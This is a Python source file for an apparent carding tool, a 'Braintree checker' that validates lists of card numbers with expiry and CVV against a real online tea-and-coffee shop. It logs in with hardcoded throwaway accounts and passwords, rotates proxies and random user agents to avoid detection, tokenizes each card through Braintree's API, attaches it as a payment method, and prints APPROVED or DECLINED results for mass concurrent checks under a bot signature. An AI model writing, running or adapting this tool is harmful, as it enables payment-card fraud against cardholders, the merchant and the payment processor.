import httpx
import re
import random
import base64
import asyncio
import time
import os
import json
from user_agent import generate_user_agent

class BraintreeChecker:
    def __init__(self):
        self.accounts = []
        self.proxies = []
        self.current_account_index = 0
        self.current_proxy_index = 0
        self.session_delay = 0.5
        self.bin_api_retries = 2  # Reduced retries for speed
        self.card_check_retries = 2
        
    def load_accounts(self):
        """Load accounts from the code or file"""
        self.accounts = [
            {"email": "atomicguillemette@tiffincrane.com", "password": "Simon99007"},
            {"email": "verbalmarti@tiffincrane.com", "password": "Simon99007"},
            {"email": "deeannewasteful@tiffincrane.com", "password": "Simon99007"},
            {"email": "blue8874@tiffincrane.com", "password": "Simon99007"},
            {"email": "homely120@tiffincrane.com", "password": "Simon99007"},
            {"email": "7576olga@tiffincrane.com", "password": "Simon99007"},
            {"email": "grubbyflorina@tiffincrane.com", "password": "Simon99007"},
            {"email": "xavoje5906@filipx.com", "password": "Simon99007"}, 
            {"email": "vamenuky@denipl.com", "password": "Simon99007"},
            {"email": "mowuraza@denipl.com", "password": "Simon99007"},
            {"email": "leonieconceptual@2200freefonts.com", "password": "Simon99007@"},
            {"email": "ealasaid27@2200freefonts.com", "password": "Simon99007"},
            {"email": "154relieved@2200freefonts.com", "password": "Simon99007"}, 
            {"email": "50intermediate@2200freefonts.com", "password": "Simon99007"},
            {"email": "3996harli@2200freefonts.com", "password": "Simon99007"}, 
            {"email": "bronzeintelligent@2200freefonts.com", "password": "Simon99007"}, 
            {"email": "lindsay53@comfythings.com", "password": "Simon99007@"},
            {"email": "statutory14@comfythings.com", "password": "Simon99007@"}
            
        ]
    
    def load_proxies(self):
        """Load proxies from file"""
        if os.path.exists('proxy.txt'):
            with open('proxy.txt', 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        return self.proxies
    
    def get_next_account(self):
        """Get next account with rotation"""
        if not self.accounts:
            return None
        
        account = self.accounts[self.current_account_index]
        self.current_account_index = (self.current_account_index + 1) % len(self.accounts)
        return account
    
    def get_next_proxy(self):
        """Get next proxy with rotation"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return proxy
    
    def parse_proxy(self, proxy_str):
        """Parse proxy string to httpx format"""
        try:
            if ":" in proxy_str:
                parts = proxy_str.split(":")
                if len(parts) == 4:
                    # Format: ip:port:username:password
                    ip, port, username, password = parts
                    return f"http://{username}:{password}@{ip}:{port}"
                elif len(parts) == 2:
                    # Format: ip:port
                    ip, port = parts
                    return f"http://{ip}:{port}"
        except:
            pass
        return None
    
    async def get_bin_info_reliable(self, bin_number):
        """BIN lookup using Binlist.net with cookie-based approach"""
        if not bin_number or len(bin_number) < 6:
            return self.get_fallback_bin_info(bin_number)
        
        max_retries = self.bin_api_retries
        bin_code = bin_number[:6]
        
        for attempt in range(max_retries):
            try:
                # Use Binlist.net API with cookies
                api_url = f'https://lookup.binlist.net/{bin_code}'
                
                # EXACT headers from your PHP code
                headers = {
                    'Host': 'lookup.binlist.net',
                    'Cookie': '_ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                
                # Use proxy or direct connection
                use_proxy = attempt % 2 == 1
                transport = None
                
                if use_proxy and self.proxies:
                    proxy_str = self.get_next_proxy()
                    proxies = self.parse_proxy(proxy_str)
                    if proxies:
                        transport = httpx.AsyncHTTPTransport(proxy=proxies, retries=3)
                
                async with httpx.AsyncClient(
                    timeout=5.0,  # Reduced timeout for speed
                    verify=False,
                    transport=transport
                ) as client:
                    response = await client.get(api_url, headers=headers)
                    
                    if response.status_code == 200:
                        # Try to parse JSON
                        try:
                            data = response.json()
                            
                            # Get bank name
                            bank_name = data.get('bank', {}).get('name', '')
                            if not bank_name:
                                bank_name = 'Unavailable'
                            
                            # Get country
                            country_name = data.get('country', {}).get('name', 'Unknown')
                            country_code = data.get('country', {}).get('alpha2', '')
                            
                            # Get brand/scheme
                            brand = data.get('scheme', 'Unknown')
                            
                            # Get type from JSON or from response text
                            card_type = data.get('type', '')
                            if not card_type:
                                # Check response text
                                response_text = response.text
                                if '"type":"credit"' in response_text:
                                    card_type = 'Credit'
                                elif '"type":"debit"' in response_text:
                                    card_type = 'Debit'
                                else:
                                    card_type = 'Unknown'
                            
                            # Get emoji
                            emoji = self.get_country_emoji(country_code)
                            
                            # Determine level based on brand
                            if brand == 'VISA':
                                if bin_number.startswith(('4', '43', '45')):
                                    level = 'CLASSIC'
                                elif bin_number.startswith(('46', '47', '48')):
                                    level = 'GOLD'
                                elif bin_number.startswith(('49')):
                                    level = 'PLATINUM'
                                else:
                                    level = 'STANDARD'
                            elif brand == 'MASTERCARD':
                                if bin_number.startswith(('51', '52', '53', '54', '55')):
                                    level = 'STANDARD'
                                elif bin_number.startswith(('2221', '2720')):
                                    level = 'WORLD'
                                else:
                                    level = 'STANDARD'
                            else:
                                level = 'STANDARD'
                            
                            return {
                                'bank': bank_name,
                                'country': country_name,
                                'brand': brand.upper(),
                                'type': card_type.upper(),
                                'level': level,
                                'emoji': emoji
                            }
                            
                        except:
                            # If JSON fails, try to extract from text
                            response_text = response.text
                            
                            # Try to find bank name
                            bank_match = re.search(r'"name"\s*:\s*"([^"]+)"', response_text)
                            bank_name = bank_match.group(1) if bank_match else 'Unavailable'
                            
                            # Try to find country
                            country_match = re.search(r'"country".*?"name"\s*:\s*"([^"]+)"', response_text)
                            country_name = country_match.group(1) if country_match else 'Unknown'
                            
                            # Try to find country code
                            code_match = re.search(r'"alpha2"\s*:\s*"([^"]+)"', response_text)
                            country_code = code_match.group(1) if code_match else ''
                            
                            # Try to find scheme/brand
                            scheme_match = re.search(r'"scheme"\s*:\s*"([^"]+)"', response_text)
                            brand = scheme_match.group(1) if scheme_match else 'Unknown'
                            
                            # Determine card type
                            card_type = 'Unknown'
                            if '"type":"credit"' in response_text:
                                card_type = 'Credit'
                            elif '"type":"debit"' in response_text:
                                card_type = 'Debit'
                            
                            emoji = self.get_country_emoji(country_code)
                            
                            return {
                                'bank': bank_name,
                                'country': country_name,
                                'brand': brand.upper(),
                                'type': card_type.upper(),
                                'level': brand.upper(),
                                'emoji': emoji
                            }
                    elif response.status_code == 429:
                        # Rate limit - shorter wait
                        if attempt < max_retries - 1:
                            wait_time = 1  # Reduced from 8 seconds
                            await asyncio.sleep(wait_time)
                    elif response.status_code == 404:
                        # BIN not found
                        break
                
                # If API call failed, wait before retry - reduced wait time
                if attempt < max_retries - 1:
                    wait_time = 0.5  # Reduced from 4 seconds
                    await asyncio.sleep(wait_time)
                    
            except httpx.TimeoutException:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
            except Exception:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1)
        
        # FINAL FALLBACK: If all retries fail
        return self.get_enhanced_fallback_bin_info(bin_number)
    
    def get_enhanced_fallback_bin_info(self, bin_number):
        """Enhanced fallback with better pattern recognition"""
        if not bin_number or len(bin_number) < 6:
            return self.get_fallback_bin_info(bin_number)
        
        # More sophisticated BIN pattern recognition
        first_six = bin_number[:6]
        
        # VISA patterns
        if bin_number.startswith('4'):
            # More specific VISA patterns
            if first_six.startswith(('4312', '4411', '4511')):  # Bank of America
                bank = 'BANK OF AMERICA'
                country = 'UNITED STATES'
                emoji = '🇺🇸'
            elif first_six.startswith(('4532', '4556', '4716')):  # Chase
                bank = 'JPMORGAN CHASE BANK'
                country = 'UNITED STATES' 
                emoji = '🇺🇸'
            elif first_six.startswith(('4024', '4175', '4408')):  # Wells Fargo
                bank = 'WELLS FARGO BANK'
                country = 'UNITED STATES'
                emoji = '🇺🇸'
            elif first_six.startswith(('4147', '4744')):  # Citi
                bank = 'CITIBANK'
                country = 'UNITED STATES'
                emoji = '🇺🇸'
            else:
                bank = 'VISA BANK'
                country = 'UNITED STATES'
                emoji = '🇺🇸'
            brand = 'VISA'
            
        # Mastercard patterns  
        elif bin_number.startswith('5'):
            if first_six.startswith(('5115', '5155', '5200')):  # Capital One
                bank = 'CAPITAL ONE'
                country = 'UNITED STATES'
                emoji = '🇺🇸'
            elif first_six.startswith(('5424', '5524')):  # US Bank
                bank = 'U.S. BANK'
                country = 'UNITED STATES'
                emoji = '🇺🇸'
            else:
                bank = 'MASTERCARD BANK'
                country = 'UNITED STATES'
                emoji = '🇺🇸'
            brand = 'MASTERCARD'
            
        # Other card types
        elif bin_number.startswith('34') or bin_number.startswith('37'):
            brand = 'AMEX'
            bank = 'AMERICAN EXPRESS'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        elif bin_number.startswith('6011') or bin_number.startswith('65'):
            brand = 'DISCOVER'
            bank = 'DISCOVER BANK'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        elif bin_number.startswith('35'):
            brand = 'JCB'
            bank = 'JCB CO. LTD'
            country = 'JAPAN'
            emoji = '🇯🇵'
        elif bin_number.startswith('62'):
            brand = 'UNIONPAY'
            bank = 'CHINA UNIONPAY'
            country = 'CHINA'
            emoji = '🇨🇳'
        else:
            brand = 'UNKNOWN'
            bank = 'UNKNOWN BANK'
            country = 'UNKNOWN'
            emoji = '🏳️'
        
        # Determine card level based on patterns
        if brand in ['VISA', 'MASTERCARD']:
            if bin_number.startswith(('4', '5')) and len(bin_number) >= 4:
                second_digit = bin_number[1] if len(bin_number) > 1 else '0'
                if second_digit in ['5', '6', '7', '8', '9']:
                    level = 'PLATINUM'
                elif second_digit in ['3', '4']:
                    level = 'GOLD'
                else:
                    level = 'CLASSIC'
            else:
                level = 'STANDARD'
        else:
            level = 'STANDARD'
        
        # Determine type based on BIN patterns (simplified)
        card_type = 'CREDIT/DEBIT'
        if brand == 'AMEX':
            card_type = 'CREDIT'
        elif first_six.startswith(('4388', '4557')):  # Common debit prefixes
            card_type = 'DEBIT'
        
        return {
            'bank': bank,
            'country': country,
            'brand': brand,
            'type': card_type,
            'level': level,
            'emoji': emoji
        }
    
    def get_country_emoji(self, country_code):
        """Convert country code to emoji"""
        if not country_code or len(country_code) != 2:
            return '🏳️'
        
        try:
            # Convert to uppercase and get emoji
            country_code = country_code.upper()
            
            # Country code to emoji mapping
            flag_emoji = ''.join(chr(127397 + ord(char)) for char in country_code)
            return flag_emoji
        except:
            return '🏳️'

    def get_fallback_bin_info(self, bin_number):
        """Basic fallback BIN info when everything fails"""
        if not bin_number or len(bin_number) < 6:
            return {
                'bank': 'Unavailable',
                'country': 'Unknown', 
                'brand': 'Unknown',
                'type': 'Unknown',
                'level': 'Unknown',
                'emoji': '🏳️'
            }
        
        # Basic pattern matching
        if bin_number.startswith('4'):
            brand = 'VISA'
            bank = 'VISA BANK'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        elif bin_number.startswith('5'):
            brand = 'MASTERCARD'
            bank = 'MASTERCARD BANK'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        elif bin_number.startswith('34') or bin_number.startswith('37'):
            brand = 'AMEX'
            bank = 'AMERICAN EXPRESS'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        elif bin_number.startswith('6'):
            brand = 'DISCOVER'
            bank = 'DISCOVER BANK'
            country = 'UNITED STATES'
            emoji = '🇺🇸'
        elif bin_number.startswith('35'):
            brand = 'JCB'
            bank = 'JCB CO. LTD'
            country = 'JAPAN'
            emoji = '🇯🇵'
        elif bin_number.startswith('62'):
            brand = 'UNIONPAY'
            bank = 'CHINA UNIONPAY'
            country = 'CHINA'
            emoji = '🇨🇳'
        else:
            brand = 'UNKNOWN'
            bank = 'UNKNOWN BANK'
            country = 'UNKNOWN'
            emoji = '🏳️'
        
        return {
            'bank': bank,
            'country': country,
            'brand': brand,
            'type': 'CREDIT/DEBIT',
            'level': 'STANDARD',
            'emoji': emoji
        }

    def determine_result_from_response(self, response_message):
        """Determine if response should be APPROVED or DECLINED based on message"""
        response_lower = response_message.lower()
        
        # APPROVED scenarios - if ANY of these keywords appear in the response, it's APPROVED
        approved_indicators = [
            'payment method successfully added',
            'payment method added',
            'successfully added',
            'cvv',  # If "cvv" appears anywhere in response
            'security code', 
            'cvc',
            'avs',  # If "avs" appears anywhere in response
            '2010',  # If "2010" appears anywhere in response
            '2011',  # If "2011" appears anywhere in response
            '3d secure',
            'authentication required',
            'insufficient funds'  # If "insufficient funds" appears anywhere in response
        ]
        
        # Check if any approved indicator is present ANYWHERE in the response
        for indicator in approved_indicators:
            if indicator in response_lower:
                return 'APPROVED'
        
        # DECLINED scenarios
        declined_indicators = [
            'invalid card number',
            'expired card',
            'stolen card',
            'lost card',
            'pick up card',
            'no such issuer',
            'invalid merchant',
            'restricted card',
            'closed card',
            '2108',  # Closed Card code
            '81703',  # Credit card type not accepted
            'credit card type is not accepted',
            'do not honor'
        ]
        
        for indicator in declined_indicators:
            if indicator in response_lower:
                return 'DECLINED'
        
        # Default to DECLINED if no specific indicators found
        return 'DECLINED'

    def format_response_message(self, response_message):
        """Format the response message properly without DECLINED prefix"""
        # Remove any "DECLINED - " prefix if present
        if response_message.startswith('DECLINED - '):
            response_message = response_message.replace('DECLINED - ', '')
        
        # Remove any "❌ DECLINED - " prefix if present  
        if response_message.startswith('❌ DECLINED - '):
            response_message = response_message.replace('❌ DECLINED - ', '')
            
        return response_message
    
    async def check_single_card(self, card_line):
        """Check a single card with account rotation - ULTRA-RELIABLE BIN lookup"""
        start_time = time.time()
        
        try:
            parts = card_line.strip().split('|')
            if len(parts) != 4:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {card_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            n, mm, yy, cvc = parts
            
            # Format month and year
            if len(mm) == 1:
                mm = f'0{mm}'
            if "20" not in yy:
                yy = f'20{yy}'
            
            # STEP 1: BIN LOOKUP
            bin_info = await self.get_bin_info_reliable(n[:6])
            
            # Check if we got real BIN data or fallback
            if bin_info['bank'] in ['VISA BANK', 'MASTERCARD BANK', 'Unavailable', 'Unknown']:
                pass
            else:
                pass
            
            # Get account and proxy
            account = self.get_next_account()
            if not account:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ No accounts available
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # Add retry logic for card processing
            for retry_attempt in range(self.card_check_retries):
                try:
                    proxy_str = self.get_next_proxy()
                    proxies = self.parse_proxy(proxy_str) if proxy_str else None
                    
                    # Process card with retry logic
                    result, response_message = await self.process_card(n, mm, yy, cvc, account, proxies)
                    elapsed_time = time.time() - start_time
                    
                    # Format the response message without DECLINED prefix
                    formatted_response = self.format_response_message(response_message)
                    
                    # Format result based on response
                    if result == "APPROVED":
                        return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {formatted_response}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    else:
                        return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {formatted_response}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
                except (httpx.TimeoutException, httpx.NetworkError, httpx.RemoteProtocolError) as e:
                    if retry_attempt < self.card_check_retries - 1:
                        await asyncio.sleep(retry_attempt + 2)
                        continue
                    else:
                        # If all retries failed, return the error
                        elapsed_time = time.time() - start_time
                        return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error after {self.card_check_retries} retries: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                except Exception as e:
                    # For other exceptions, don't retry
                    elapsed_time = time.time() - start_time
                    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
        except Exception as e:
            elapsed_time = time.time() - start_time
            # Even if processing fails, we still have BIN info from the reliable lookup
            bin_info = await self.get_bin_info_reliable(n[:6]) if 'n' in locals() else self.get_fallback_bin_info('')
            return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {card_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
    
    async def process_card(self, cc, mm, yy, cvc, account, proxies=None):
        """Process a single card with given account and proxy - USING EXACT finalb3mass11.py LOGIC"""
        try:
            user = generate_user_agent()
            
            # Configure proxy if available
            transport = None
            if proxies:
                transport = httpx.AsyncHTTPTransport(proxy=proxies, retries=3)
            
            async with httpx.AsyncClient(
                follow_redirects=True,
                timeout=30,
                transport=transport
            ) as client:
                # STEP 1: Get login page
                response = await client.get('https://www.tea-and-coffee.com/account/')
                
                # Find login nonce
                login_nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
                if not login_nonce_match:
                    return 'DECLINED', 'Could not find login nonce'
                
                nonce = login_nonce_match.group(1)

                # STEP 2: Login
                login_data = {
                    'username': account['email'],
                    'password': account['password'],
                    'woocommerce-login-nonce': nonce,
                    '_wp_http_referer': '/account/',
                    'login': 'Log in',
                }
                
                response = await client.post(
                    'https://www.tea-and-coffee.com/account/',
                    data=login_data
                )
                
                # Check if login was successful
                if not ('Log out' in response.text or 'My Account' in response.text):
                    return 'DECLINED', 'Login failed'

                # STEP 3: Get payment page
                response = await client.get('https://www.tea-and-coffee.com/account/add-payment-method-custom/')

                # Find payment nonce
                payment_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
                if not payment_nonce_match:
                    return 'DECLINED', 'Could not find payment nonce'
                
                nonce = payment_nonce_match.group(1)

                # Find client nonce
                client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
                if not client_nonce_match:
                    return 'DECLINED', 'Could not find client token nonce'
                
                client_nonce = client_nonce_match.group(1)

                # STEP 4: Get client token
                token_data = {
                    'action': 'wc_braintree_credit_card_get_client_token',
                    'nonce': client_nonce,
                }

                response = await client.post(
                    'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
                    data=token_data
                )
                
                if response.status_code != 200:
                    return 'DECLINED', f'Client token request failed with status {response.status_code}'
                    
                token_response = response.json()
                if 'data' not in token_response:
                    return 'DECLINED', 'No data in client token response'
                    
                enc = token_response['data']
                try:
                    dec = base64.b64decode(enc).decode('utf-8')
                except:
                    return 'DECLINED', 'Failed to decode client token'
                
                # Find authorization fingerprint
                authorization_match = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
                if not authorization_match:
                    return 'DECLINED', 'Could not find authorization fingerprint in client token'
                
                authorization = authorization_match[0]

                # STEP 5: Tokenize card
                braintree_headers = {
                    'authority': 'payments.braintree-api.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'authorization': f'Bearer {authorization}',
                    'braintree-version': '2018-05-10',
                    'content-type': 'application/json',
                    'origin': 'https://assets.braintreegateway.com',
                    'referer': 'https://assets.braintreegateway.com/',
                    'user-agent': user,
                }

                tokenize_data = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': str(random.randint(1000000000, 9999999999)),
                    },
                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
                    'variables': {
                        'input': {
                            'creditCard': {
                                'number': cc,
                                'expirationMonth': mm,
                                'expirationYear': yy,
                                'cvv': cvc,
                            },
                            'options': {
                                'validate': False,
                            },
                        },
                    },
                }
                
                response = await client.post(
                    'https://payments.braintree-api.com/graphql',
                    headers=braintree_headers,
                    json=tokenize_data
                )

                if response.status_code != 200:
                    return 'DECLINED', f'Tokenization failed with status {response.status_code}'

                tokenize_response = response.json()
                if 'data' not in tokenize_response or 'tokenizeCreditCard' not in tokenize_response['data']:
                    if 'errors' in tokenize_response:
                        error_msg = tokenize_response['errors'][0].get('message', 'Tokenization failed')
                        # Determine result based on the actual error message
                        result = self.determine_result_from_response(error_msg)
                        return result, f'{error_msg}'
                    return 'DECLINED', 'Tokenization failed - no token in response'
                    
                tok = tokenize_response['data']['tokenizeCreditCard']['token']

                # STEP 6: Process payment - EXACT LOGIC FROM finalb3mass11.py
                payment_headers = {
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.tea-and-coffee.com',
                    'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
                    'user-agent': user,
                }

                # Determine card type
                card_type = "visa" if cc.startswith("4") else "mastercard" if cc.startswith("5") else "discover"

                payment_data = {
                    'payment_method': 'braintree_credit_card',
                    'wc-braintree-credit-card-card-type': card_type,
                    'wc-braintree-credit-card-3d-secure-enabled': '',
                    'wc-braintree-credit-card-3d-secure-verified': '',
                    'wc-braintree-credit-card-3d-secure-order-total': '20.78',
                    'wc_braintree_credit_card_payment_nonce': tok,
                    'wc_braintree_device_data': '',
                    'wc-braintree-credit-card-tokenize-payment-method': 'true',
                    'woocommerce-add-payment-method-nonce': nonce,
                    '_wp_http_referer': '/account/add-payment-method-custom/',
                    'woocommerce_add_payment_method': '1',
                }
                
                response = await client.post(
                    'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
                    headers=payment_headers,
                    data=payment_data,
                    follow_redirects=True
                )
                
                # EXACT RESPONSE PARSING FROM finalb3mass11.py
                response_text = response.text

                # Check for success
                if any(success_msg in response_text for success_msg in [
                    'Nice! New payment method added', 
                    'Payment method successfully added',
                    'Payment method added',
                    'successfully added'
                ]):
                    return 'APPROVED', 'Payment method added successfully'
                
                # Check for specific error patterns
                error_pattern = r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>'
                error_match = re.search(error_pattern, response_text, re.DOTALL)
                
                if error_match:
                    error_msg = error_match.group(1).strip()
                    result = self.determine_result_from_response(error_msg)
                    return result, f'{error_msg}'
                
                # Check for generic WooCommerce errors
                if 'woocommerce-error' in response_text:
                    return "DECLINED", "Payment Failed"
                
                # If we got a 302 but ended up here, check final URL
                if 'account' in str(response.url) and 'payment' not in str(response.url):
                    return "DECLINED", "Redirected to account page (likely auth issue)"
                    
                return "DECLINED", "Unknown response"

        except httpx.TimeoutException:
            return 'DECLINED', 'Request timeout'
        except httpx.NetworkError:
            return 'DECLINED', 'Network connection failed'
        except Exception as e:
            return 'DECLINED', f'{str(e)}'

# Global checker instance
braintree_checker = BraintreeChecker()

def initialize_braintree():
    """Initialize the Braintree checker"""
    braintree_checker.load_accounts()
    braintree_checker.load_proxies()
    return "✅ Braintree checker initialized"

async def check_card_braintree(cc_line):
    """Main function to check card via Braintree (single card)"""
    return await braintree_checker.check_single_card(cc_line)

async def check_cards_braintree(cc_lines):
    """Mass check function for multiple cards - optimized with concurrent processing"""
    results = []
    # Process cards concurrently with semaphore to limit concurrent requests
    semaphore = asyncio.Semaphore(5)  # Max 5 concurrent requests
    
    async def process_card(cc_line):
        async with semaphore:
            return await check_card_braintree(cc_line)
    
    # Create tasks for all cards
    tasks = [process_card(cc_line) for cc_line in cc_lines]
    # Execute all tasks concurrently
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Convert exceptions to error messages
    final_results = []
    for result in results:
        if isinstance(result, Exception):
            final_results.append(f"ERROR ❌\n\n💳𝗖𝗖 ⇾ Error: {str(result)}\n💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth  - 1\n🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』")
        else:
            final_results.append(result)
    
    return final_results

# For standalone testing
if __name__ == "__main__":
    # Initialize the checker
    initialize_braintree()
    
    # Test with a single card
    async def test():
        test_cc = "4111111111111111|12|2025|123"
        print("Testing Braintree checker...")
        result = await check_card_braintree(test_cc)
        print(result)
    
    asyncio.run(test())
